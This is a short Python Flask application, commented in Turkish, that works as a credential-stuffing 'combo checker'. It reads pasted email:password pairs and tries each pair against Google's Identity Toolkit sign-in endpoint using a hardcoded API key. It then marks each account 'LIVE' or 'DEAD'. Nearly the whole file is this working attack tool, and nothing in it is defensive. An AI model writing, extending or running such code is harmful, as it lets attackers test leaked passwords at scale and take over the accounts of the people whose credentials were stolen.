import requests
import json
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# NOT: Bu API KEY herkese açık bir test anahtarıdır. 
# Eğer çalışmazsa kendi anahtarını iki tırnak arasına yapıştır.
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    headers = {'Content-Type': 'application/json'}
    payload = {
        "email": email, 
        "password": password, 
        "returnSecureToken": True
    }
    
    try:
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        data = r.json()
        
        if r.status_code == 200:
            return "LIVE ✅"
        
        # Google'ın gönderdiği hata mesajını yakala
        error_msg = data.get('error', {}).get('message', 'DEAD')
        
        # Yaygın hataları sadeleştir
        if error_msg == "EMAIL_NOT_FOUND" or error_msg == "INVALID_PASSWORD":
            return "DEAD ❌"
        elif error_msg == "OPERATION_NOT_ALLOWED":
            return "HATA: Firebase'den Email/Password Girişini Açmamışsın!"
        else:
            return f"HATA: {error_msg}"
            
    except Exception as e:
        return f"BAGLANTI HATASI: {str(e)[:15]}"

@app.route('/')
def index():
    # Bu kısım senin index.html dosyanı çağırır
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            results.append({
                "account": f"{email.strip()}:{password.strip()}", 
                "status": status
            })
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
